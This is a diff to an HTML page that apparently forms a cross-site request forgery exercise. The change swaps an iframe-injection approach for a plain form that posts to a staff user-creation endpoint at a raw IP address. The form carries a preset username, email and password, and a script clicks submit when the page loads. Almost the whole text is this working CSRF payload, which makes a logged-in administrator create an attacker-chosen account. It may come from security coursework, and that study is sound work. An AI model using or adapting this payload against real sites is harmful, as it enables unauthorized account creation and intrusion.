@@ -9,23 +9,17 @@
 </head>
 
 <body>
-    <iframe id="myid" src="https://104.198.208.81/red/public/staff/users/new.php" style="display:none;"></iframe>
+    <form action="https://104.198.208.81/red/public/staff/users/new.php" id="form1" method="POST">
+        <input name="first_name" value="Johnny">
+        <input name="last_name" value="Bravo">
+        <input name="username" value="johnnybravo">
+        <input name="email" value="johnnybravo@gmail.com">
+        <input type="password" name="password" value="111111111Aa#">
+        <input type="password" name="confirm_password" value="111111111Aa#">
+        <button id="myform" type="submit" form="form1" value="Create">Create</button>
+    </form>
     <script>
-        var iframe = document.getElementById('myid');
-        var innerDoc = iframe.contentDocument || iframe.contentWindow.document;
-        var content1 = innerDoc.getElementById("main-content");
-        var str =
-            `<form action="https://104.198.208.81/red/public/staff/users/new.php" id="form1" method="POST">
-            <input name="first_name" value="Johnny">
-            <input name="last_name" value="Bravo">
-            <input name="username" value="johnnybravo">
-            <input name="email" value="johnnybravo@gmail.com">
-            <input type="password" name="password" value="111111111Aa#">
-            <input type="password" name="confirm_password" value="111111111Aa#">
-            <button id="myform" type="submit" form="form1" value="Create">Create</button>
-         </form>`;
-        content1.insertAdjacentHTML('beforeend', str);
-        innerDoc.getElementById("myform").click();
+        document.getElementById("myform").click();
     </script>
 </body>
 
